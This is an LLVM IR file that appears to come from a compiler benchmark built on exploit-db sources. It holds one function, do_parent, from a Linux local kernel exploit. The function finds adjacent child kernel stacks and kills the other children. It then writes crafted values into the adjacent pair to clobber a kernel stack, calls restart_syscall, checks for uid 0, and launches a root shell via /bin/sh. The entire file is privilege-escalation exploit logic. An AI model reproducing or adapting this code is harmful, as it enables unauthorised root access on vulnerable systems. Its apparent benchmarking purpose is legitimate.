; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_17787.c_do_parent.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_17787.c_do_parent.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64*, i64 }

@NPROC = common dso_local global i32 0, align 4
@region = common dso_local global %struct.TYPE_2__* null, align 8
@KSTACK_UNINIT = common dso_local global i64 0, align 8
@KSTACK_SIZE = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [49 x i8] c"[-] failed to find adjacent kstacks, try again!\0A\00", align 1
@.str.1 = private unnamed_addr constant [56 x i8] c"[+] found adjacent children kstacks at 0x%lx and 0x%lx\0A\00", align 1
@KSTACK_DIE = common dso_local global i64 0, align 8
@KSTACK_UPPER = common dso_local global i64 0, align 8
@KSTACK_LOWER = common dso_local global i64 0, align 8
@KSTACK_CLOBBER = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [30 x i8] c"[+] escalating privileges...\0A\00", align 1
@__NR_restart_syscall = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [44 x i8] c"[-] privilege escalation failed, aborting!\0A\00", align 1
@.str.4 = private unnamed_addr constant [27 x i8] c"[+] launching root shell!\0A\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @do_parent() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  br label %5

5:                                                ; preds = %0, %31
  %6 = call i32 @sleep(i32 1)
  store i32 0, i32* %1, align 4
  br label %7

7:                                                ; preds = %23, %5
  %8 = load i32, i32* %1, align 4
  %9 = load i32, i32* @NPROC, align 4
  %10 = icmp slt i32 %8, %9
  br i1 %10, label %11, label %26

11:                                               ; preds = %7
  %12 = load %struct.TYPE_2__*, %struct.TYPE_2__** @region, align 8
  %13 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %12, i32 0, i32 0
  %14 = load i64*, i64** %13, align 8
  %15 = load i32, i32* %1, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i64, i64* %14, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = load i64, i64* @KSTACK_UNINIT, align 8
  %20 = icmp eq i64 %18, %19
  br i1 %20, label %21, label %22

21:                                               ; preds = %11
  br label %26

22:                                               ; preds = %11
  br label %23

23:                                               ; preds = %22
  %24 = load i32, i32* %1, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %1, align 4
  br label %7

26:                                               ; preds = %21, %7
  %27 = load i32, i32* %1, align 4
  %28 = load i32, i32* @NPROC, align 4
  %29 = icmp eq i32 %27, %28
  br i1 %29, label %30, label %31

30:                                               ; preds = %26
  br label %32

31:                                               ; preds = %26
  br label %5

32:                                               ; preds = %30
  store i32 0, i32* %1, align 4
  br label %33

33:                                               ; preds = %71, %32
  %34 = load i32, i32* %1, align 4
  %35 = load i32, i32* @NPROC, align 4
  %36 = icmp slt i32 %34, %35
  br i1 %36, label %37, label %74

37:                                               ; preds = %33
  store i32 0, i32* %2, align 4
  br label %38

38:                                               ; preds = %62, %37
  %39 = load i32, i32* %2, align 4
  %40 = load i32, i32* @NPROC, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %65

42:                                               ; preds = %38
  %43 = load %struct.TYPE_2__*, %struct.TYPE_2__** @region, align 8
  %44 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %43, i32 0, i32 0
  %45 = load i64*, i64** %44, align 8
  %46 = load i32, i32* %1, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i64, i64* %45, i64 %47
  %49 = load i64, i64* %48, align 8
  %50 = load %struct.TYPE_2__*, %struct.TYPE_2__** @region, align 8
  %51 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i32 0, i32 0
  %52 = load i64*, i64** %51, align 8
  %53 = load i32, i32* %2, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i64, i64* %52, i64 %54
  %56 = load i64, i64* %55, align 8
  %57 = load i64, i64* @KSTACK_SIZE, align 8
  %58 = add nsw i64 %56, %57
  %59 = icmp eq i64 %49, %58
  br i1 %59, label %60, label %61

60:                                               ; preds = %42
  br label %65

61:                                               ; preds = %42
  br label %62

62:                                               ; preds = %61
  %63 = load i32, i32* %2, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %2, align 4
  br label %38

65:                                               ; preds = %60, %38
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* @NPROC, align 4
  %68 = icmp ne i32 %66, %67
  br i1 %68, label %69, label %70

69:                                               ; preds = %65
  br label %74

70:                                               ; preds = %65
  br label %71

71:                                               ; preds = %70
  %72 = load i32, i32* %1, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %1, align 4
  br label %33

74:                                               ; preds = %69, %33
  %75 = load i32, i32* %1, align 4
  %76 = load i32, i32* @NPROC, align 4
  %77 = icmp eq i32 %75, %76
  br i1 %77, label %78, label %85

78:                                               ; preds = %74
  %79 = load i32, i32* %2, align 4
  %80 = load i32, i32* @NPROC, align 4
  %81 = icmp eq i32 %79, %80
  br i1 %81, label %82, label %85

82:                                               ; preds = %78
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0))
  %84 = call i32 @exit(i32 1) #3
  unreachable

85:                                               ; preds = %78, %74
  %86 = load i32, i32* %1, align 4
  store i32 %86, i32* %3, align 4
  %87 = load i32, i32* %2, align 4
  store i32 %87, i32* %4, align 4
  %88 = load %struct.TYPE_2__*, %struct.TYPE_2__** @region, align 8
  %89 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %88, i32 0, i32 0
  %90 = load i64*, i64** %89, align 8
  %91 = load i32, i32* %4, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i64, i64* %90, i64 %92
  %94 = load i64, i64* %93, align 8
  %95 = load %struct.TYPE_2__*, %struct.TYPE_2__** @region, align 8
  %96 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %95, i32 0, i32 0
  %97 = load i64*, i64** %96, align 8
  %98 = load i32, i32* %3, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i64, i64* %97, i64 %99
  %101 = load i64, i64* %100, align 8
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.1, i64 0, i64 0), i64 %94, i64 %101)
  store i32 0, i32* %1, align 4
  br label %103

103:                                              ; preds = %124, %85
  %104 = load i32, i32* %1, align 4
  %105 = load i32, i32* @NPROC, align 4
  %106 = icmp slt i32 %104, %105
  br i1 %106, label %107, label %127

107:                                              ; preds = %103
  %108 = load i32, i32* %1, align 4
  %109 = load i32, i32* %3, align 4
  %110 = icmp ne i32 %108, %109
  br i1 %110, label %111, label %123

111:                                              ; preds = %107
  %112 = load i32, i32* %1, align 4
  %113 = load i32, i32* %4, align 4
  %114 = icmp ne i32 %112, %113
  br i1 %114, label %115, label %123

115:                                              ; preds = %111
  %116 = load i64, i64* @KSTACK_DIE, align 8
  %117 = load %struct.TYPE_2__*, %struct.TYPE_2__** @region, align 8
  %118 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %117, i32 0, i32 0
  %119 = load i64*, i64** %118, align 8
  %120 = load i32, i32* %1, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i64, i64* %119, i64 %121
  store i64 %116, i64* %122, align 8
  br label %123

123:                                              ; preds = %115, %111, %107
  br label %124

124:                                              ; preds = %123
  %125 = load i32, i32* %1, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %1, align 4
  br label %103

127:                                              ; preds = %103
  %128 = load i64, i64* @KSTACK_UPPER, align 8
  %129 = load %struct.TYPE_2__*, %struct.TYPE_2__** @region, align 8
  %130 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %129, i32 0, i32 0
  %131 = load i64*, i64** %130, align 8
  %132 = load i32, i32* %3, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i64, i64* %131, i64 %133
  store i64 %128, i64* %134, align 8
  %135 = load i64, i64* @KSTACK_LOWER, align 8
  %136 = load %struct.TYPE_2__*, %struct.TYPE_2__** @region, align 8
  %137 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %136, i32 0, i32 0
  %138 = load i64*, i64** %137, align 8
  %139 = load i32, i32* %4, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds i64, i64* %138, i64 %140
  store i64 %135, i64* %141, align 8
  br label %142

142:                                              ; preds = %127, %150
  %143 = call i32 @sleep(i32 1)
  %144 = load %struct.TYPE_2__*, %struct.TYPE_2__** @region, align 8
  %145 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %144, i32 0, i32 1
  %146 = load i64, i64* %145, align 8
  %147 = load i64, i64* @KSTACK_CLOBBER, align 8
  %148 = icmp eq i64 %146, %147
  br i1 %148, label %149, label %150

149:                                              ; preds = %142
  br label %151

150:                                              ; preds = %142
  br label %142

151:                                              ; preds = %149
  %152 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.2, i64 0, i64 0))
  %153 = load i32, i32* @__NR_restart_syscall, align 4
  %154 = call i32 @syscall(i32 %153)
  %155 = call i64 (...) @getuid()
  %156 = icmp ne i64 %155, 0
  br i1 %156, label %157, label %160

157:                                              ; preds = %151
  %158 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.3, i64 0, i64 0))
  %159 = call i32 @exit(i32 1) #3
  unreachable

160:                                              ; preds = %151
  %161 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0))
  %162 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i32* null)
  ret void
}

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @syscall(i32) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
